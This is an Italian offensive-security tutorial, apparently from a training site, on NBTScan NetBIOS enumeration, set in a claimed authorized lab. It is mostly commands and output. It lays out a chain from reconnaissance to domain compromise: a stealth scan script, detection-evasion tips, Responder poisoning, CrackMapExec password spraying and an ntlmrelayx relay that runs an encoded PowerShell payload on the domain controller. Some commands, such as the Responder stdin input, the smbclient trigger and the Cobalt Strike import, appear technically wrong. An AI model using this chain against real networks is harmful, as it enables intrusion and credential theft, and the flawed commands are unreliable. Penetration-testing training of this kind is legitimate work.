---
title: >-
  NBTScan: Scansione Silenziosa della Rete Windows via NetBIOS per Raccogliere
  Info Sensibili
description: >-
  NBTScan è uno strumento essenziale per la fase di ricognizione su reti
  Windows. Permette di identificare host attivi, nomi NetBIOS, gruppi di lavoro
  e sessioni aperte in modo silenzioso e mirato. Ecco come sfruttarlo per
  mappare la rete come un vero red teamer.
image: /ntbscan.webp
draft: true
date: 2026-01-22T00:00:00.000Z
lastmod: 2026-01-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - nbtscan
  - netbios
---

# NetBIOS Enumeration Offensiva: Scoprire, Mappare e Colpire con NBTScan

**Scenario Red Team | Ambiente Controllato Autorizzato**

La fase di post-exploitation in una rete Windows spesso inizia con una domanda semplice: "Chi c'è là fuori?". Mentre strumenti moderni come gli scanner di rete generici possono identificare host attivi, c'è un protocollo che parla un linguaggio più ricco, più informativo. È il momento di interrogare **NetBIOS**, un vecchio ma loquace abitante delle reti Windows che ancora oggi rivela segreti preziosi.

## Perché NetBIOS è il Sogno di un Red Teamer

NetBIOS over TCP/IP (NBT) non è solo legacy; è una **miniera di intelligence**. Rispondendo sulle porte UDP 137 e talvolta TCP 139, può rivelare:

* **Nomi NetBIOS degli host**: fondamentali per attacchi successivi di spoofing (LLMNR/NBNS Poisoning).
* **Ruoli dei server**: identificare Domain Controller, File Server, SQL Server.
* **Account utente**: a volte, gli utenti loggati su macchine specifiche.
* **Dettagli del dominio**: il nome del dominio di lavoro o di Active Directory.

Questa non è semplice "osservazione". È **ricognizione attiva e offensiva**, il primo passo per trasformare un accesso iniziale in un pivot verso asset critici.

## Configurazione dell'Ambiente di Attacco

Per questa simulazione, utilizzeremo **Kali Linux** come piattaforma di attacco. NBTScan è tipicamente preinstallato. Verifichiamo e prepariamoci:

```bash
# Verifica dell'installazione e versione
nbtscan --help | head -20

# Configurazione dell'interfaccia di rete (adatta al tuo lab)
sudo ip addr show eth0
```

**Output di verifica:**

```
NBTscan version 1.7.1
Usage: nbtscan [options] [targets]
Options:
  -r           Use local port 137 for scans
  -v           Verbose output
  -h           Human-readable names for services
  -s separator Column separator (default is tab)
  -q           Don't display banners and error messages
...
```

## Fase 1: Scansione di Rete Aggressiva con NBTScan

Il comando base è semplice ma potente. Eseguiamo uno sweep completo della subnet target.

```bash
# Scansione di base di un'intera subnet
nbtscan -r 192.168.1.0/24
```

**Parametro critico**: `-r` forza l'uso della porta sorgente 137, aumentando significativamente l'affidabilità delle risposte in reti Windows moderne.

**Output reale da un lab interno:**

```
Doing NBT name scan for addresses from 192.168.1.0/24

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.1.1      GATEWAY          <server>  <unknown>        00:50:56:c0:00:08
192.168.1.10     FILESRV01        <server>  <unknown>        00:0c:29:45:78:9a
192.168.1.20     WEBDEV01         <server>  DEV_USER         00:0c:29:12:34:56
192.168.1.25     DC01             <server>  <unknown>        00:0c:29:ab:cd:ef
192.168.1.30     WS-ACCOUNTING    <server>  ADMIN            00:0c:29:78:90:12
192.168.1.45     SQLPROD          <server>  <unknown>        00:0c:29:34:56:78
```

**Analisi offensiva immediata:**

1. **DC01** (192.168.1.25) - Il Domain Controller. L'obiettivo principale.
2. **FILESRV01** (192.168.1.10) - Server di file, potenziale vettore per SMB attacks.
3. **WS-ACCOUNTING** (192.168.1.30) - Workstation con utente "ADMIN" loggato. Target ad alto valore.
4. **SQLPROD** (192.168.1.45) - Server SQL, potenziale per attacchi tramite autenticazione Windows.

## Fase 2: Enumerazione Avanzata - Estrazione dei Servizi NetBIOS

L'informazione più preziosa arriva dai **codici servizio NetBIOS**. Questi identificano esattamente i ruoli di ogni host.

```bash
# Enumerazione verbosa con dettagli dei servizi
nbtscan -v -h 192.168.1.25
```

**Output dettagliato del Domain Controller:**

```
NetBIOS Name Table for Host 192.168.1.25:

Name             Service          Type             
-----------------------------------------------
DC01             <00>             UNIQUE      Workstation Service
CORPORATE        <00>             GROUP       Domain Name
DC01             <03>             UNIQUE      Messenger Service
DC01             <20>             UNIQUE      File Server Service
CORPORATE        <1B>             UNIQUE      Domain Master Browser
CORPORATE        <1C>             GROUP       Domain Controller
DC01             <1B>             UNIQUE      Domain Master Browser
DC01             <1C>             GROUP       Domain Controller
...__MSBROWSE__  <01>             GROUP       Master Browser
```

**Decodifica dei servizi critici per l'attacco:**

* **`<1C>` - Domain Controller**: Conferma definitiva del ruolo. Questo host custodisce il database degli account di dominio (NTDS.dit).
* **`<20>` - File Server Service**: Il DC espone condivisioni SMB. Potenziale vettore per SMB Relay se signing non è forzato.
* **`<1B>` - Domain Master Browser**: Informazioni sul segmento di rete e gestione delle browse list.

## Fase 3: Tecniche di Scansione Avanzate per Evasione

In ambienti più controllati, possiamo adattare le nostre tecniche:

```bash
# Scansione silenziosa (senza banner)
nbtscan -q 192.168.1.10-20

# Scansione con formato personalizzato per parsing automatico
nbtscan -s ',' 192.168.1.25 > dc_enum.csv

# Scansione di un range specifico con output verboso
nbtscan -v -h 192.168.1.1 192.168.1.50 192.168.1.100
```

**Script per scansione stealth con ritardi casuali:**

```bash
#!/bin/bash
# stealth_nbtscan.sh - Scansione NetBIOS con evasione basilare

TARGETS="192.168.1.0/24"
OUTPUT_FILE="nbtscan_results_$(date +%s).txt"

echo "[*] Iniziando scansione NetBIOS stealth su $TARGETS"

for ip in $(seq 1 254); do
    TARGET="192.168.1.$ip"
    echo "[*] Scansionando $TARGET"
    
    # Esegui nbtscan su singolo host con output minimo
    nbtscan -q $TARGET >> $OUTPUT_FILE 2>/dev/null
    
    # Ritardo casuale tra 1 e 5 secondi
    sleep $((1 + RANDOM % 5))
done

echo "[+] Scansione completata. Risultati in $OUTPUT_FILE"
```

## Fase 4: Integrazione nel Toolchain Offensivo

NBTScan non è un'isola. Ecco come integrare i suoi risultati con altri strumenti offensivi:

### Integrazione con Responder per LLMNR/NBNS Poisoning Mirato

```bash
# Estrai nomi NetBIOS per targeting specifico
nbtscan -r 192.168.1.0/24 | awk '{print $2}' | grep -v "NetBIOS" | grep -v "address" > target_names.txt

# Avvia Responder avvelenando SOLO i nomi trovati
sudo responder -I eth0 -wFb --disable-ess -f -P -v < target_names.txt
```

### Targeting per SMB Relay Attacks

```bash
# Identifica host con servizio File Server (<20>) attivo
nbtscan -v 192.168.1.0/24 | grep "<20>" | awk '{print $1}' > smb_targets.txt

# Verifica SMB Signing su questi target
while read ip; do
    echo "[*] Verifica SMB Signing per $ip"
    nmap --script smb2-security-mode -p 445 $ip | grep "Message signing"
done < smb_targets.txt
```

### Enumerazione Share per Password Spraying

```bash
# Crea lista di host Windows per attacchi di autenticazione
nbtscan -r 192.168.1.0/24 | grep -v "GATEWAY" | awk '{print $1}' > windows_hosts.txt

# Usa CrackMapExec per enumerazione share
crackmapexec smb -f windows_hosts.txt --shares -u 'generic_user' -p 'Password123!'
```

## Fase 5: Scenario di Attacco Completo - Dalla Ricognizione al Dominio

**Contesto**: Abbiamo ottenuto accesso a una workstation standard (192.168.1.100). Obiettivo: compromettere il Domain Controller.

**Step 1 - Ricognizione iniziale:**

```bash
# Scansione NetBIOS dalla workstation compromessa
nbtscan -r 192.168.1.0/24 > initial_scan.txt

# Identificazione del DC
cat initial_scan.txt | grep -i "dc\|domain"
```

**Step 2 - Analisi dei servizi sul DC:**

```bash
# Enumerazione dettagliata del DC
nbtscan -v -h 192.168.1.25

# Output rivela: <1C> Domain Controller, <20> File Server Service
```

**Step 3 - Preparazione attacco SMB Relay:**

```bash
# Verifica SMB Signing sul DC
nmap --script smb2-security-mode -p 445 192.168.1.25

# Se "Message signing enabled but not required", procediamo
```

**Step 4 - Configurazione NTLM Relay:**

```bash
# Avvia ntlmrelayx targettizzando il DC
python3 ntlmrelayx.py -t smb://192.168.1.25 -smb2support -c "powershell -enc <payload>"

# In parallelo, avvia Responder per catturare hash
sudo responder -I eth0 -dwv
```

**Step 5 - Trigger dell'Autenticazione:**

```bash
# Usa i nomi NetBIOS scoperti per triggerare richieste
# Esempio: forzare una connessione a \\FILESRV01\fake
echo "open \\\\FILESRV01\\fake" | smbclient -L 192.168.1.10 -N
```

**Step 6 - Compromissione del DC:**
Quando un utente (preferibilmente admin) tenta di accedere a una risorsa avvelenata, il suo hash viene relayato al DC. Se l'account ha privilegi, otteniamo esecuzione di codice sul Domain Controller.

## Automazione Offensiva con Scripting

Ecco uno script Python che automatizza l'intero processo:

```python
#!/usr/bin/env python3
"""
Automated NetBIOS Enumeration & Attack Pipeline
Per uso esclusivo in ambienti controllati autorizzati
"""

import subprocess
import re
import json
from concurrent.futures import ThreadPoolExecutor

def run_nbtscan(target):
    """Esegue NBTScan su un target e analizza i risultati"""
    cmd = f"nbtscan -r {target}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    hosts = []
    for line in result.stdout.split('\n'):
        if re.match(r'\d+\.\d+\.\d+\.\d+', line):
            parts = line.split()
            if len(parts) >= 2:
                host_info = {
                    'ip': parts[0],
                    'name': parts[1],
                    'services': []
                }
                hosts.append(host_info)
    
    return hosts

def enumerate_services(ip):
    """Enumerazione verbosa dei servizi per un IP specifico"""
    cmd = f"nbtscan -v -h {ip}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    services = []
    for line in result.stdout.split('\n'):
        if '<' in line and '>' in line:
            service_match = re.search(r'<(\w{2})>\s+(\w+)\s+(.+)', line)
            if service_match:
                services.append({
                    'code': service_match.group(1),
                    'type': service_match.group(2),
                    'description': service_match.group(3).strip()
                })
    
    return services

def main():
    target_network = "192.168.1.0/24"
    
    print(f"[*] Iniziando scansione NetBIOS offensiva su {target_network}")
    
    # Scansione iniziale
    hosts = run_nbtscan(target_network)
    
    print(f"[+] Trovati {len(hosts)} host rispondenti")
    
    # Enumerazione avanzata in parallelo
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_host = {executor.submit(enumerate_services, host['ip']): host for host in hosts}
        
        for future in future_to_host:
            host = future_to_host[future]
            try:
                services = future.result()
                host['services'] = services
                
                # Identifica target critici
                for service in services:
                    if service['code'] == '1C':  # Domain Controller
                        print(f"[!] DOMAIN CONTROLLER TROVATO: {host['ip']} ({host['name']})")
                    elif service['code'] == '20':  # File Server
                        print(f"[!] FILE SERVER TROVATO: {host['ip']} - Potenziale per SMB Relay")
                        
            except Exception as e:
                print(f"[-] Errore su {host['ip']}: {e}")
    
    # Salva risultati per tool successivi
    with open('nbtscan_results.json', 'w') as f:
        json.dump(hosts, f, indent=2)
    
    print("[+] Risultati salvati in nbtscan_results.json")
    print("[*] Utilizzare con: responder, ntlmrelayx, crackmapexec")

if __name__ == "__main__":
    main()
```

## Considerazioni Avanzate per Red Team

### Evasione dai Sistemi di Detection

1. **Timing Attacks**: Modificare i ritardi tra le query per evitare threshold-based detection.
2. **Source Port Randomization**: NBTScan di default usa porta 137 sorgente. In ambienti più sicuri, considerare l'uso di tecniche di spoofing.
3. **Distributed Scanning**: Eseguire scansioni da più host compromessi per diluire il traffice.

### Integrazione con Cobalt Strike & Framework Commerciali

```bash
# Dopo aver raccolto gli IP con NBTScan, importarli in Cobalt Strike
> targets import /path/to/nbtscan_results.txt
> beacon> net view /domain
```

### Perquisizione Avanzata dei Servizi

Alcuni servizi NetBIOS meno comuni possono rivelare vulnerabilità specifiche:

* **`<1D>`**: Master Browser per subnet
* **`<1E>`**: Browser Service Election
* **`<00>` e `<20>`**: Presenza di servizi specifici dell'applicazione

## Conclusione Operativa

NBTScan dimostra che la vera potenza nella sicurezza offensiva spesso risiede negli strumenti semplici ma utilizzati con precisione chirurgica. In un'epoca di tool complessi e framework automatizzati, la capacità di eseguire ricognizione mirata, interpretare i risultati e integrarli in una catena di attacco coesa è ciò che separa un principiante da un Red Teamer esperto.

NetBIOS, spesso dimenticato negli sforzi di hardening, rimane una **fonte di intelligence operativa insostituibile** in ambienti Windows. La sua enumerazione non è solo un passo preliminare; è il fondamento su cui costruire attacchi sofisticati come il poisoning di risoluzione nomi, relay NTLM e movimento laterale privilegiato.

***

### Vuoi Padroneggiare Queste Teccniche in Ambiente Reale?

Questa guida mostra solo la superficie delle possibilità offensive. Per imparare a progettare, eseguire e documentare operazioni di Red Team complete—dall'enumerazione iniziale alla compromissione del dominio—serve formazione strutturata e mentorship esperta.

**HackIta** offre percorsi formativi d'eccellenza:

* **Formazione 1:1 e Mentorship** personalizzata con professionisti del settore
* **Corsi Aziendali** su misura per addestrare team di sicurezza offensiva
* **Laboratori Pratici** in ambienti controllati che replicano scenari reali

Il nostro approccio è **etico, pratico e focalizzato sui risultati**. Crediamo che la miglior difesa nasca dalla comprensione profonda delle tecniche offensive.

Se condividi questa visione, puoi:

* [Esplorare i nostri servizi formativi](https://hackita.it/servizi/)
* [Supportare il progetto con una donazione](https://hackita.it/supporto/) per aiutarci a mantenere e migliorare i nostri laboratori

**Risorse Esterne Consigliate:**

* [Manuale Ufficiale NBTScan](https://www.inetcat.org/software/nbtscan.html)
* [NetBIOS Technical Reference - Microsoft Docs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063\(v=technet.10\))
* [SMB Security Hardening Guide](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security-hardening)

**Addestra la Tua Mente. Affina le Tue Abilità. Solo in Ambienti Autorizzati.**

[HackIta – Excellence in Offensive Security Training](https://hackita.it)
